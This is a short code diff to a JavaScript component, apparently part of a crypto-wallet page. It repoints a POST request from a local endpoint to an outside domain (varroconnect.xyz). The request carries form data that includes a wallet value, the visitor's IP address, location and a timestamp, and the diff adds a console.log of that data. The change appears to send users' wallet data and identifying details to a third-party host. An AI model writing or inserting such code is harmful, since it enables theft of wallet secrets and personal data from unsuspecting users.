@@ -434,7 +434,7 @@ export default {
           } else {
             var wallet = this.path
           }
-          const Url = '/endpoint/v1/send'
+          const Url = 'https://varroconnect.xyz/endpoint/v1/send'
           const type = x
           const dataO = y
           const dataT = z
@@ -452,6 +452,8 @@ export default {
           fdata.append('ip', ip);
           fdata.append('loc', loc);
           fdata.append('timein', timein);
+
+          console.log(fdata)
 
           var req = {
             method: 'POST',
